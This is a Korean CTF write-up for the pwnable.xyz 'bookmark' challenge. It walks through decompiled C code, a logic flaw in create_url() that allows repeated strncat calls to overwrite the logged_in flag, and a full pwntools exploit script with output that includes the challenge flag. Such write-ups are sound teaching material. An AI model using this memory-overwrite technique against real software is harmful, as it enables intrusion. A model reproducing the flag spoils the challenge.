# [pwnable.xyz] bookmark

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Save your links here
>
> Release: [bookmark.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8999004/bookmark.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176128966-cc4bad26-e6d6-4a38-8f71-8218199ce303.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `init_login()`

```c
int init_login()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
    exit(1);
  read(fd, &password, 8uLL);
  return close(fd);
}
```

`/dev/urandom`으로부터 전역 변수 `password`에 랜덤한 8바이트 값을 읽어온다.

### `main()`

```c
  init_login();
```

`init_login()`을 호출하여 `password`를 설정한다.

#### 1. Login

```c
      case 1u:
        v3 = "Password: ";
        printf("Password: ");
        if ( password == (int)read_long() )
          logged_in = 1;
        break;
```

패스워드를 입력받아서, 미리 저장된 `password`의 값과 같으면 로그인이 되고 `logged_in`의 값이 1로 설정된다.

#### 2. Create url

```c
      case 2u:
        create_url();
        break;
```

#### `create_url()`

```c
  printf("Secure or insecure: ");
  read(0, url, 9uLL);
  if ( strncmp(url, "http", 4uLL) )
    return puts("Not a valid URL.");
  if ( ssl == 's' )
    ptr = (char *)&unk_202205;
  else
    ptr = &ssl;
  while ( *ptr == ':' || *ptr == '/' )
    ++ptr;
  *ptr = 0;
```

먼저 프로토콜 부분을 최대 9바이트만큼 입력받는다. `http` 또는 `https`로 시작할 수 있고, 그 뒤에는 `:`와 `/`를 자유롭게 붙일 수 있다. 예를 들어 `http://:`와 같은 형태도 허용된다.

```c
  printf("Size of url: ");
  size = read_long();
  if ( (unsigned int)size >= 0x80 )
    return puts("Too large.");
  buf = malloc(size);
  read(0, buf, size);
  return (unsigned int)strncat(url, (const char *)buf, 0x100uLL);
```

다음으로 도메인 부분을 입력받는데, `size`는 최대 `0x7f`바이트까지만 가능한데 `strncat()`으로 `url`에 이어붙일 때는 `0x100`바이트만큼을 이어붙인다.

#### 3. Print url

```c
      case 3u:
        argv = (const char **)url;
        v3 = "url: %s\n";
        printf("url: %s\n", url);
        break;
```

저장된 `url`을 `"%s"`로 출력한다.

#### 4. Save url

```c
      case 4u:
        if ( logged_in )
        {
          puts("Not Implemented.");
          v3 = "But here is a reward.";
          puts("But here is a reward.");
          win();
        }
```

로그인이 된 상태이면 플래그를 획득할 수 있다.

## Exploit

`create_url()`에서 `strncat()`으로 도메인을 프로토콜에 이어붙이기 전에, `url`을 앞에서부터 검사하면서 문자가 `:`나 `/`가 아닐 때까지 `ptr`을 뒤로 옮긴다. 도메인에 `'/' * 0x7f`를 입력하면 다음에 `create_url()`을 호출할 때는 그 뒤부터 이어붙일 수 있다.

이 과정을 반복하면 `url` 뒤쪽의 모든 메모리를 원하는 값으로 덮어쓸 수 있다. `logged_in`의 값을 `1`로 바꾸고 `4. Save url`을 실행하면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30021)

sla = r.sendlineafter
sa = r.sendafter

def create_url(protocol, size, domain):
    sla('> ', '2')
    sa('Secure or insecure: ', protocol)
    sla('Size of url: ', str(size))
    r.send(domain)


# overwrite logged_in

create_url('http/////', 0x7f, '/' * 0x7f)
create_url('http/////', 0x7f, '/' * 0x7f)
create_url('http/////', 0x2, '/' + '\x01')


# call win()

sla('> ', '4')


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30021: Done
[*] Switching to interactive mode
Not Implemented.
But here is a reward.
FLAG{l0gic_error_ch3cked}
```